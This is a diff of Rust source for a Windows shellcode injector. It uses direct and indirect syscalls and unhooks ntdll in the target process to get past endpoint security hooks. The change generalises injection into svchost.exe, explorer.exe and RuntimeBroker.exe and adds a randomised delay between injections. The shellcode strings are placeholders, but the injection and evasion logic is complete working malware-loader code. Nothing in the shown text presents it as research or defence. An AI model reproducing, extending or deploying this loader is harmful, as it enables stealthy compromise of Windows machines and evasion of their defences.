@@ -126,7 +126,9 @@ extern "C" {
     fn asm_nt_query_information_process(ProcessHandle: HANDLE, ProcessInformationClass: u32, ProcessInformation: *mut std::ffi::c_void, ProcessInformationLength: u32, ReturnLength: &mut u32, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
 }
 
-const SHELLCODE: &str = "Sh_replace";
+const SHELLCODE1: &str = "AAA=";
+const SHELLCODE2: &str = "AAA=";
+const SHELLCODE3: &str = "AAA=";
 
 fn get_module_base_address(process_handle: HANDLE, module_name: &str, gadgets: &syscall::Gadgets) -> Option<usize> {
     let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
@@ -324,7 +326,7 @@ fn unhook_remote_ntdll(process_handle: HANDLE, remote_base: usize, gadgets: &sys
     }
 }
 
-fn get_process_pid() -> Option<u32> {
+fn get_process_pid(target_name: &str) -> Option<u32> {
     unsafe {
         let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).unwrap();
         if snapshot.is_invalid() {
@@ -339,7 +341,7 @@ fn get_process_pid() -> Option<u32> {
                 let end = process_entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                 let bytes = std::slice::from_raw_parts(process_entry.szExeFile.as_ptr() as *const u8, end);
                 let process_name = String::from_utf8_lossy(bytes);
-                if process_name == "RuntimeBroker.exe" {
+                if process_name.eq_ignore_ascii_case(target_name) {
                     CloseHandle(snapshot);
                     return Some(process_entry.th32ProcessID);
                 }
@@ -354,17 +356,16 @@ fn get_process_pid() -> Option<u32> {
     None
 }
 
-fn main() {
-    let gadgets = syscall::get_nt_gadgets().expect("Gadgets not found");
-    let target_pid = get_process_pid().expect("Process not found");
-    let shellcode = general_purpose::STANDARD.decode(SHELLCODE).expect("Invalid shellcode");
+fn inject(target_name: &str, shellcode_b64: &str, gadgets: &syscall::Gadgets) -> Option<()> {
+    let target_pid = get_process_pid(target_name)?;
+    let shellcode = general_purpose::STANDARD.decode(shellcode_b64).ok()?;
 
     let mut process_handle: HANDLE = 0;
     let mut object_attributes: OBJECT_ATTRIBUTES = unsafe { mem::zeroed() };
     let mut client_id: CLIENT_ID = unsafe { mem::zeroed() };
     client_id.UniqueProcess = target_pid as _;
 
-    let nt_open_process_syscall = syscall::get_syscall_number("NtOpenProcess").expect("Syscall not found");
+    let nt_open_process_syscall = syscall::get_syscall_number("NtOpenProcess")?;
 
     let status = unsafe {
         asm_nt_open_process(
@@ -378,15 +379,15 @@ fn main() {
         )
     };
 
-    if status != 0 { return; }
+    if status != 0 { return None; }
 
-    if let Some(ntdll_base) = get_module_base_address(process_handle, "ntdll.dll", &gadgets) {
-        unhook_remote_ntdll(process_handle, ntdll_base, &gadgets);
+    if let Some(ntdll_base) = get_module_base_address(process_handle, "ntdll.dll", gadgets) {
+        unhook_remote_ntdll(process_handle, ntdll_base, gadgets);
     }
 
     let mut alloc_addr: *mut std::ffi::c_void = std::ptr::null_mut();
     let mut size = shellcode.len();
-    let nt_allocate_virtual_memory_syscall = syscall::get_syscall_number("NtAllocateVirtualMemory").expect("Syscall not found");
+    let nt_allocate_virtual_memory_syscall = syscall::get_syscall_number("NtAllocateVirtualMemory")?;
 
     let status = unsafe {
         asm_nt_allocate_virtual_memory(
@@ -402,10 +403,13 @@ fn main() {
         )
     };
 
-    if status != 0 { return; }
+    if status != 0 {
+        unsafe { asm_nt_close(process_handle, syscall::get_syscall_number("NtClose")?, gadgets.syscall_ret, gadgets.ret); }
+        return None;
+    }
 
     let mut bytes_written = 0;
-    let nt_write_virtual_memory_syscall = syscall::get_syscall_number("NtWriteVirtualMemory").expect("Syscall not found");
+    let nt_write_virtual_memory_syscall = syscall::get_syscall_number("NtWriteVirtualMemory")?;
 
     let status = unsafe {
         asm_nt_write_virtual_memory(
@@ -420,10 +424,13 @@ fn main() {
         )
     };
 
-    if status != 0 { return; }
+    if status != 0 {
+        unsafe { asm_nt_close(process_handle, syscall::get_syscall_number("NtClose")?, gadgets.syscall_ret, gadgets.ret); }
+        return None;
+    }
 
     let mut thread_handle: HANDLE = 0;
-    let nt_create_thread_ex_syscall = syscall::get_syscall_number("NtCreateThreadEx").expect("Syscall not found");
+    let nt_create_thread_ex_syscall = syscall::get_syscall_number("NtCreateThreadEx")?;
 
     let status = unsafe {
         asm_nt_create_thread_ex(
@@ -444,12 +451,26 @@ fn main() {
         )
     };
 
-    if status != 0 { return; }
-
-    let nt_close_syscall = syscall::get_syscall_number("NtClose").expect("Syscall not found");
-
+    let nt_close_syscall = syscall::get_syscall_number("NtClose")?;
     unsafe {
-        asm_nt_close(thread_handle, nt_close_syscall, gadgets.syscall_ret, gadgets.ret);
+        if status == 0 {
+            asm_nt_close(thread_handle, nt_close_syscall, gadgets.syscall_ret, gadgets.ret);
+        }
         asm_nt_close(process_handle, nt_close_syscall, gadgets.syscall_ret, gadgets.ret);
     }
+
+    if status == 0 { Some(()) } else { None }
+}
+
+fn main() {
+    let gadgets = syscall::get_nt_gadgets().expect("Gadgets not found");
+
+    inject("svchost.exe", SHELLCODE1, &gadgets);
+
+    let seed = unsafe { windows_sys::Win32::System::SystemInformation::GetTickCount64() };
+    let delay = 5 + (seed % 16); // 5 to 20 seconds
+    std::thread::sleep(std::time::Duration::from_secs(delay));
+
+    inject("explorer.exe", SHELLCODE2, &gadgets);
+    inject("RuntimeBroker.exe", SHELLCODE3, &gadgets);
 }
